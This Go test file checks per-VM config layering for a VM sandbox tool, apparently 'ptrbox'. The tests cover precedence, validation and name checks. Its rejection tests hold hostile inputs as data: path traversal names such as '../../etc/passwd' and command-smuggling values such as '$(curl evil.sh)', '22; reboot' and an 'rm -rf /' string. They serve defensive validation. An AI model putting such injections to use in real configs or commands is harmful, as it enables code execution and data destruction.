package config

// Per-VM config layering. The rule under test everywhere below: each layer
// states only what it changes, and a key it does not mention falls through to
// the layer beneath it.

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// writeVMConfig puts a per-VM file where Overlay will look for it.
func writeVMConfig(t *testing.T, vm, body string) {
	t.Helper()
	if err := os.MkdirAll(VMDir(), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(VMConfigPath(vm), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// mustOverlay resolves the config with vm's per-VM file layered in.
func mustOverlay(t *testing.T, vm string) *Config {
	t.Helper()
	cfg, err := mustLoad(t).Overlay(vm)
	if err != nil {
		t.Fatalf("Overlay(%q): %v", vm, err)
	}
	return cfg
}

// overlayErr asserts Overlay fails and that the message mentions want.
func overlayErr(t *testing.T, vm, want string) {
	t.Helper()
	base, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	cfg, err := base.Overlay(vm)
	if err == nil {
		t.Fatalf("Overlay(%q) succeeded, wanted an error about %q (got distro %q)",
			vm, want, cfg.Distro)
	}
	if !strings.Contains(err.Error(), want) {
		t.Errorf("Overlay(%q) error = %v, want it to mention %q", vm, err, want)
	}
}

// --- derived values ----------------------------------------------------------

// The reason a per-VM override re-resolves every layer instead of patching
// the field it names: IMAGE_URL is derived from DISTRO, so a per-VM distro
// that did not re-derive would produce a VM labelled ubuntu booting Debian.
func TestPerVMDistroOverrideRederivesTheImageURL(t *testing.T) {
	setup(t)
	writeVMConfig(t, "thesis", "PTRBOX_DISTRO=ubuntu2404\n")

	cfg := mustOverlay(t, "thesis")
	if cfg.Distro != "ubuntu2404" {
		t.Fatalf("Distro = %q, want ubuntu2404", cfg.Distro)
	}
	if !strings.HasSuffix(cfg.ImageURL, "ubuntu-24.04-server-cloudimg-arm64.img") {
		t.Errorf("ImageURL = %q, want the ubuntu image", cfg.ImageURL)
	}
}

// The same thing with the trap set: a pinned image URL one layer down. The
// per-VM distro is the more specific statement, so it wins and re-derives.
func TestPerVMDistroBeatsAPinnedImageURLInTheMainConfig(t *testing.T) {
	_, configPath := setup(t)
	writeConfig(t, configPath, "PTRBOX_IMAGE_URL=https://example.com/pinned-arm64.qcow2\n")
	writeVMConfig(t, "thesis", "PTRBOX_DISTRO=ubuntu2404\n")

	if url := mustOverlay(t, "thesis").ImageURL; !strings.HasSuffix(url, "ubuntu-24.04-server-cloudimg-arm64.img") {
		t.Errorf("ImageURL = %q, want the per-VM distro to have re-derived it", url)
	}
	// And the sandbox with no per-VM file still gets the pin.
	if url := mustLoad(t).ImageURL; url != "https://example.com/pinned-arm64.qcow2" {
		t.Errorf("ImageURL without an overlay = %q, want the pin", url)
	}
}

// A URL named in the same file as the distro is the more specific of the two
// and stands - which is what makes IMAGE_URL usable as an escape hatch at all.
func TestAnImageURLBesideTheDistroInTheSameLayerStands(t *testing.T) {
	setup(t)
	writeVMConfig(t, "thesis", "PTRBOX_DISTRO=ubuntu2404\n"+
		"PTRBOX_IMAGE_URL=https://example.com/custom-arm64.qcow2\n")

	if url := mustOverlay(t, "thesis").ImageURL; url != "https://example.com/custom-arm64.qcow2" {
		t.Errorf("ImageURL = %q, want the explicit URL", url)
	}
}

// --- precedence --------------------------------------------------------------

func TestPerVMFileOverridesTheMainConfig(t *testing.T) {
	_, configPath := setup(t)
	writeConfig(t, configPath, "PTRBOX_MEMORY=8GiB\nPTRBOX_CPUS=4\n")
	writeVMConfig(t, "thesis", "PTRBOX_MEMORY=4GiB\n")

	cfg := mustOverlay(t, "thesis")
	if cfg.Memory != "4GiB" {
		t.Errorf("Memory = %q, want the per-VM 4GiB", cfg.Memory)
	}
	// Untouched by the per-VM file, so it falls through to the main config.
	if cfg.CPUs != 4 {
		t.Errorf("CPUs = %d, want the main config's 4", cfg.CPUs)
	}
}

// The main config does not have to be complete, and neither does a per-VM
// file: the only complete layer is the built-in defaults, in code.
func TestKeysInNoFileFallThroughToTheBuiltInDefaults(t *testing.T) {
	setup(t)
	writeVMConfig(t, "thesis", "PTRBOX_MEMORY=4GiB\n")

	cfg := mustOverlay(t, "thesis")
	if cfg.CPUs != 4 {
		t.Errorf("CPUs = %d, want the built-in default", cfg.CPUs)
	}
	if cfg.Disk != "50GiB" {
		t.Errorf("Disk = %q, want the built-in default", cfg.Disk)
	}
	if cfg.Distro != "debian13" {
		t.Errorf("Distro = %q, want the built-in default", cfg.Distro)
	}
}

func TestTheEnvironmentStillBeatsAPerVMFile(t *testing.T) {
	setup(t)
	writeVMConfig(t, "thesis", "PTRBOX_MEMORY=4GiB\n")
	t.Setenv("PTRBOX_MEMORY", "16GiB")

	if mem := mustOverlay(t, "thesis").Memory; mem != "16GiB" {
		t.Errorf("Memory = %q, want the environment's 16GiB", mem)
	}
}

// A sandbox with no per-VM file must resolve exactly as it does today. This
// is the assertion that says adding the feature changed nothing for anyone
// not using it.
func TestNoPerVMFileResolvesExactlyLikeLoad(t *testing.T) {
	_, configPath := setup(t)
	writeConfig(t, configPath, "PTRBOX_MEMORY=6GiB\nPTRBOX_EXTRA_PACKAGES=\"ripgrep sqlite3\"\n")

	base := mustLoad(t)
	overlaid := mustOverlay(t, "plain")
	if !reflect.DeepEqual(base, overlaid) {
		t.Errorf("Overlay with no per-VM file differs from Load:\n base = %+v\n over = %+v",
			base, overlaid)
	}
}

// Whole-value override, like every other key. Special-casing the one list
// setting to append would mean a VM holding a package that appears in no
// single file, and the rule to remember stops being one rule.
func TestExtraPackagesAreReplacedNotAppended(t *testing.T) {
	_, configPath := setup(t)
	writeConfig(t, configPath, "PTRBOX_EXTRA_PACKAGES=\"ripgrep sqlite3\"\n")
	writeVMConfig(t, "thesis", "PTRBOX_EXTRA_PACKAGES=\"texlive-latex-recommended latexmk\"\n")

	got := mustOverlay(t, "thesis").ExtraPackageList()
	if got != "texlive-latex-recommended latexmk" {
		t.Errorf("ExtraPackageList = %q, want only the per-VM list", got)
	}
}

// --- what a per-VM file may say ----------------------------------------------

// Refused rather than ignored: a per-VM PROXY_PORT would point one sandbox at
// a proxy that is not there, and that surfaces minutes later as "the agent
// has no network" - the failure class item 20 existed to kill.
func TestAHostGlobalKeyInAPerVMFileIsAnError(t *testing.T) {
	for _, key := range []string{"PROXY_PORT", "PROXY_HOST", "REPO_ROOT", "KEYCHAIN_SERVICE", "DNS_SERVERS", "BIN_DIR"} {
		t.Run(key, func(t *testing.T) {
			setup(t)
			writeVMConfig(t, "thesis", "PTRBOX_"+key+"=8\n")
			overlayErr(t, "thesis", key)
		})
	}
}

func TestEveryPerVMKeyIsAcceptedInAPerVMFile(t *testing.T) {
	// Values that pass validation for each settable key.
	valid := map[string]string{
		"CPUS": "2", "MEMORY": "4GiB", "DISK": "20GiB",
		"PORT_MIN": "4000", "PORT_MAX": "5000",
		"DISTRO": "ubuntu2404", "IMAGE_URL": "https://example.com/x.qcow2",
		"EXTRA_PACKAGES": "latexmk", "CLAUDE_MODEL": "opus",
		"TOOLCHAIN": "node", "NODE_VERSION": "22",
		"GIT_USER_NAME": "Someone", "GIT_USER_EMAIL": "someone@example.com",
	}
	for _, key := range PerVMKeys() {
		value, ok := valid[key]
		if !ok {
			t.Fatalf("PerVMKeys names %s but this test has no valid value for it", key)
		}
		t.Run(key, func(t *testing.T) {
			setup(t)
			writeVMConfig(t, "thesis", "PTRBOX_"+key+"=\""+value+"\"\n")
			mustOverlay(t, "thesis")
		})
	}
}

// The per-VM layer is exactly the create-time class: keys consumed by
// `ptrbox new` and then frozen into the generated Lima config. Nothing that
// describes the host - one proxy, one Keychain, one repo root - may be in it.
func TestPerVMKeysAreOnlyTheCreateTimeOnes(t *testing.T) {
	hostWide := map[string]bool{
		"REPO_ROOT": true, "PROXY_HOST": true, "PROXY_PORT": true,
		"PROXY_CPUS": true, "PROXY_MEMORY": true, "PROXY_DISK": true,
		"KEYCHAIN_SERVICE": true, "SQUID_LOG": true, "BIN_DIR": true,
		// Technically per-VM, deliberately not settable: it is rendered into
		// the guest's nftables ruleset, so it is an invariant-2 decision.
		"DNS_SERVERS": true,
	}
	for _, key := range Keys {
		if perVMKeys[key] && hostWide[key] {
			t.Errorf("%s is settable per VM but describes the host", key)
		}
		if !perVMKeys[key] && !hostWide[key] {
			t.Errorf("%s is neither settable per VM nor listed as host-wide - "+
				"decide which it is, in perVMKeys and in this test", key)
		}
	}
}

// A per-VM value is validated like any other. The check is the same one, at
// the same moment; there is no path where a per-VM file gets a laxer read.
func TestPerVMValuesAreValidated(t *testing.T) {
	for _, tc := range []struct{ name, body, want string }{
		{"memory", "PTRBOX_MEMORY=lots\n", "8GiB or 512MiB"},
		{"packages", "PTRBOX_EXTRA_PACKAGES=\"latexmk; reboot\"\n", "not a valid apt package name"},
		{"distro", "PTRBOX_DISTRO=arch\n", "unknown PTRBOX_DISTRO"},
		{"image", "PTRBOX_IMAGE_URL=http://example.com/x.qcow2\n", "must be https"},
		{"ports", "PTRBOX_PORT_MIN=9000\nPTRBOX_PORT_MAX=3000\n", "is above"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			setup(t)
			writeVMConfig(t, "thesis", tc.body)
			overlayErr(t, "thesis", tc.want)
		})
	}
}

// --- the name reaching the filesystem ----------------------------------------

// The name selects a path element, so it is held to the one rule that already
// decides what a VM may be called. Nothing here should be able to read a file
// outside the per-VM directory.
func TestOverlayRefusesANameThatIsNotAVMName(t *testing.T) {
	for _, name := range []string{
		"../config", "../../etc/passwd", "a/b", "", "Thesis", "thesis.conf", "-x",
	} {
		t.Run(name, func(t *testing.T) {
			setup(t)
			overlayErr(t, name, "not a VM name")
		})
	}
}

// The names VMName produces are exactly the names Overlay accepts, so no
// sandbox can exist that is unable to have a per-VM file.
func TestEveryVMNameIsAcceptableToOverlay(t *testing.T) {
	setup(t)
	for _, arg := range []string{"thesis", "my-api", "/home/x/code/Some_Repo", "repo123"} {
		name, err := VMName(arg)
		if err != nil {
			t.Fatalf("VMName(%q): %v", arg, err)
		}
		if _, err := mustLoad(t).Overlay(name); err != nil {
			t.Errorf("Overlay(%q) from arg %q: %v", name, arg, err)
		}
	}
}

// --- warnings ----------------------------------------------------------------

// Overlay re-reads every layer, so the main config's warnings come back with
// it. Returning them again would print each one twice and read as two
// problems.
func TestOverlayReportsOnlyItsOwnWarnings(t *testing.T) {
	_, configPath := setup(t)
	writeConfig(t, configPath, "PTRBOX_NONSENSE=1\n")
	writeVMConfig(t, "thesis", "PTRBOX_ALSO_NONSENSE=1\n")

	base := mustLoad(t)
	if len(base.Warnings) != 1 || !strings.Contains(base.Warnings[0], "PTRBOX_NONSENSE") {
		t.Fatalf("Load warnings = %q", base.Warnings)
	}
	cfg, err := base.Overlay("thesis")
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Warnings) != 1 || !strings.Contains(cfg.Warnings[0], "PTRBOX_ALSO_NONSENSE") {
		t.Errorf("Overlay warnings = %q, want only the per-VM file's", cfg.Warnings)
	}
}

// --- documentation -----------------------------------------------------------

// Every key is documented in the shipped example, commented out. A setting
// you have to read the Go source to discover is a setting nobody changes:
// BIN_DIR was exactly that until this test existed.
func TestEveryKeyIsDocumentedInTheExampleConfig(t *testing.T) {
	path := filepath.Join("..", "..", "config", "ptrbox.conf.example")
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	for _, key := range Keys {
		if !strings.Contains(string(body), "#PTRBOX_"+key+"=") {
			t.Errorf("config/ptrbox.conf.example does not document PTRBOX_%s "+
				"(wanted a commented `#PTRBOX_%s=` line)", key, key)
		}
	}
}

// ...and the example is inert as shipped: copying it to ~/.config/ptrbox/config
// must change nothing, which is only true if every line really is commented.
func TestTheExampleConfigSetsNothingAsShipped(t *testing.T) {
	_, configPath := setup(t)
	body, err := os.ReadFile(filepath.Join("..", "..", "config", "ptrbox.conf.example"))
	if err != nil {
		t.Fatal(err)
	}
	writeConfig(t, configPath, string(body))

	values, warnings, err := parseFile(configPath)
	if err != nil {
		t.Fatalf("the shipped example does not parse: %v", err)
	}
	if len(values) != 0 {
		t.Errorf("the shipped example sets %v, want nothing", values)
	}
	if len(warnings) != 0 {
		t.Errorf("the shipped example warns: %q", warnings)
	}
}

// --- language runtimes -------------------------------------------------------

// The toolchain is a per-VM decision in practice: a document repo wants
// neither runtime, a JS project wants node pinned. This is the case the
// feature exists for.
func TestToolchainAndNodeVersionAreSettablePerVM(t *testing.T) {
	_, configPath := setup(t)
	writeConfig(t, configPath, "PTRBOX_TOOLCHAIN=\"node uv\"\n")
	writeVMConfig(t, "thesis", "PTRBOX_TOOLCHAIN=\"\"\n")
	writeVMConfig(t, "webapp", "PTRBOX_TOOLCHAIN=node\nPTRBOX_NODE_VERSION=22.11.0\n")

	if got := mustOverlay(t, "thesis").ToolchainList(); got != "" {
		t.Errorf("thesis toolchain = %q, want none", got)
	}
	webapp := mustOverlay(t, "webapp")
	if got := webapp.ToolchainList(); got != "node" {
		t.Errorf("webapp toolchain = %q, want node alone", got)
	}
	if webapp.NodeVersion != "22.11.0" {
		t.Errorf("webapp node version = %q, want the pin", webapp.NodeVersion)
	}
	// And a sandbox that says nothing still gets both, at LTS.
	base := mustLoad(t)
	if got := base.ToolchainList(); got != "node uv" {
		t.Errorf("default toolchain = %q, want both", got)
	}
	if base.NodeVersion != "lts" {
		t.Errorf("default node version = %q, want lts", base.NodeVersion)
	}
}

// Only runtimes 30-toolchain.sh knows how to install. A name nothing installs
// would become a vm/verify.sh check that can never pass, which is a VM that
// can never be created and no way to tell why from the message.
func TestAnUnknownRuntimeIsRefused(t *testing.T) {
	for _, name := range []string{"python", "rust", "npm", "Node"} {
		t.Run(name, func(t *testing.T) {
			setup(t)
			writeVMConfig(t, "thesis", "PTRBOX_TOOLCHAIN="+name+"\n")
			overlayErr(t, "thesis", "is not a runtime ptrbox installs")
		})
	}
}

// The node version is interpolated into `nvm install "..."` inside the guest,
// so the charset is the whole defence. Everything nvm understands passes;
// nothing that could leave the quotes does.
func TestNodeVersionRejectsAnythingShellish(t *testing.T) {
	for _, bad := range []string{
		"22; reboot", "$(curl evil.sh)", "`id`", "\"; rm -rf /; \"", "-lts", "",
	} {
		t.Run(bad, func(t *testing.T) {
			setup(t)
			writeVMConfig(t, "thesis", "PTRBOX_NODE_VERSION='"+bad+"'\n")
			overlayErr(t, "thesis", "PTRBOX_NODE_VERSION")
		})
	}
}

func TestNodeVersionAcceptsWhatNvmUnderstands(t *testing.T) {
	for _, good := range []string{"lts", "node", "lts/hydrogen", "22", "22.11.0"} {
		t.Run(good, func(t *testing.T) {
			setup(t)
			writeVMConfig(t, "thesis", "PTRBOX_NODE_VERSION="+good+"\n")
			if got := mustOverlay(t, "thesis").NodeVersion; got != good {
				t.Errorf("NodeVersion = %q, want %q", got, good)
			}
		})
	}
}
